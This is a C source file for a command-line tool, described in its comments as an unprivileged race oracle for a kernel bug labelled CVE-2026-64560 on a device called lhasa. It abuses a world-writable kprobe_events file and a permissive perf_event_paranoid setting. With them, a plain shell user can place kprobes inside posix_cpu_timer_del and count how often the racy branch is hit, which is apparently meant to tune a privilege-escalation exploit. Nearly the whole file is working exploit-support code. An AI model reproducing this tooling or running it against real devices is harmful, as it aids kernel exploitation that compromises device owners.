/*
 * l66_oracle.c - unprivileged race oracle for CVE-2026-64560 on lhasa.
 *
 * dmesg / kmsg / pstore are all closed to uid 2000 on this device, so the
 * WARNING at posix_cpu_timer_del+0xc0 (the lhasa build of
 * "if (!sh) WARN_ON_ONCE(timer_queued(tmr))") is invisible.  But:
 *
 *   - /sys/kernel/tracing/kprobe_events is 0777 and SELinux lets shell write it,
 *     so we can register a kprobe at that exact instruction (symbol+offset, no
 *     KASLR knowledge needed - the kernel resolves the symbol itself);
 *   - /proc/sys/kernel/perf_event_paranoid is -1, so PERF_TYPE_TRACEPOINT with
 *     the kprobe's event id is open to uid 2000.  perf enables the tracepoint
 *     while the event is open; the ftrace "enable" file (0640 root) is not
 *     needed at all.
 *
 * Result: a plain shell process can count how many times the kernel walked the
 * "sighand == NULL" branch inside posix_cpu_timer_del - i.e. exactly the race
 * we care about - without dmesg, without a crash and without any privilege.
 *
 * usage:
 *   l66_oracle install [sym+off ...]   register probes, print their event ids
 *   l66_oracle count <name> <pid> <sec>  count events for <sec>, every second
 *   l66_oracle list                   show kprobe_events
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#define KPROBE_EVENTS "/sys/kernel/tracing/kprobe_events"
#define KPROBE_DIR    "/sys/kernel/tracing/events/kprobes"
#define PERF_TYPE_TRACEPOINT 2
#define MAXCPU 16

struct perf_event_attr_min {
    uint32_t type;
    uint32_t size;
    uint64_t config;
    uint64_t sample_period;
    uint64_t sample_type;
    uint64_t read_format;
    uint64_t flags;
    uint32_t wakeup_events;
    uint32_t bp_type;
    uint64_t config1;
    uint64_t config2;
};

static long perf_open(uint64_t id, int cpu)
{
    struct perf_event_attr_min a;
    memset(&a, 0, sizeof a);
    a.type = PERF_TYPE_TRACEPOINT;
    a.size = sizeof(a);
    a.config = id;
    a.sample_period = 0;          /* counting, not sampling */
    return syscall(SYS_perf_event_open, &a, -1, cpu, -1, 0);
}

static int read_int_file(const char *path)
{
    char buf[64];
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, sizeof buf - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = 0;
    return atoi(buf);
}

static int kprobe_add(const char *name, const char *spec)
{
    int fd = open(KPROBE_EVENTS, O_WRONLY | O_APPEND);
    char line[256];
    int n;

    if (fd < 0) { printf("open %s: errno=%d\n", KPROBE_EVENTS, errno); return -1; }
    n = snprintf(line, sizeof line, "p:%s %s\n", name, spec);
    if (write(fd, line, (size_t)n) != n) {
        printf("write kprobe_events (%s): errno=%d (%s)\n", spec, errno, strerror(errno));
        close(fd);
        return -1;
    }
    close(fd);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc < 2) {
        fprintf(stderr,
                "usage:\n"
                "  %s install [sym+off ...]\n"
                "  %s count <name> <pid> <sec>\n",
                argv[0], argv[0]);
        return 2;
    }

    if (!strcmp(argv[1], "install")) {
        const char *defs[] = { "posix_cpu_timer_del+0xc0", "posix_cpu_timer_del+0xb8",
                               "posix_cpu_timers_exit_group", NULL };
        char name[64];

        if (argc > 2) {
            for (int i = 2; i < argc; i++) {
                snprintf(name, sizeof name, "l66w%d", i - 2);
                if (kprobe_add(name, argv[i]) == 0)
                    printf("registered %s -> %s\n", name, argv[i]);
            }
        } else {
            for (int ndef = 0; defs[ndef]; ndef++) {
                snprintf(name, sizeof name, "l66w%d", ndef);
                if (kprobe_add(name, defs[ndef]) == 0)
                    printf("registered %s -> %s\n", name, defs[ndef]);
            }
        }
        for (int i = 0; i < 8; i++) {
            char p[256];
            snprintf(p, sizeof p, KPROBE_DIR "/l66w%d/id", i);
            int id = read_int_file(p);
            if (id > 0) {
                char e[256];
                printf("l66w%d id=%d\n", i, id);
                /* the enable file is 0640 root, but perf does not need it */
                snprintf(e, sizeof e, KPROBE_DIR "/l66w%d/format", i);
                (void)e;
            }
        }
        return 0;
    }

    if (!strcmp(argv[1], "count")) {
        const char *name = argc > 2 ? argv[2] : "l66w0";
        int pid = argc > 3 ? atoi(argv[3]) : -1;
        int sec = argc > 4 ? atoi(argv[4]) : 30;
        char path[256];
        long fds[MAXCPU];
        int ncpu = 0;

        snprintf(path, sizeof path, KPROBE_DIR "/%s/id", name);
        int id = read_int_file(path);
        if (id <= 0) { printf("no event id for %s (errno=%d)\n", name, errno); return 1; }

        for (int c = 0; c < MAXCPU; c++) {
            long fd = pid > 0 ? perf_open((uint64_t)id, -1) : perf_open((uint64_t)id, c);
            if (fd < 0) {
                if (c == 0) printf("perf_event_open failed: errno=%d (%s)\n", errno, strerror(errno));
                break;
            }
            fds[ncpu++] = fd;
            if (pid > 0) break;
        }
        printf("event=%s id=%d fds=%d watching %d s\n", name, id, ncpu, sec);
        fflush(stdout);

        unsigned long long last = 0;
        for (int t = 1; t <= sec; t++) {
            usleep(1000000);
            unsigned long long total = 0;
            for (int i = 0; i < ncpu; i++) {
                unsigned long long v = 0;
                if (read((int)fds[i], &v, sizeof v) == sizeof v) total += v;
            }
            printf("t=%ds count=%llu (+%llu)\n", t, total, total - last);
            fflush(stdout);
            last = total;
        }
        for (int i = 0; i < ncpu; i++) close((int)fds[i]);
        return 0;
    }

    if (!strcmp(argv[1], "list")) {
        char buf[2048];
        int fd = open(KPROBE_EVENTS, O_RDONLY);
        ssize_t n;
        if (fd < 0) { printf("errno=%d\n", errno); return 1; }
        n = read(fd, buf, sizeof buf - 1);
        close(fd);
        if (n > 0) { buf[n] = 0; fputs(buf, stdout); }
        return 0;
    }

    fprintf(stderr, "unknown command\n");
    return 2;
}
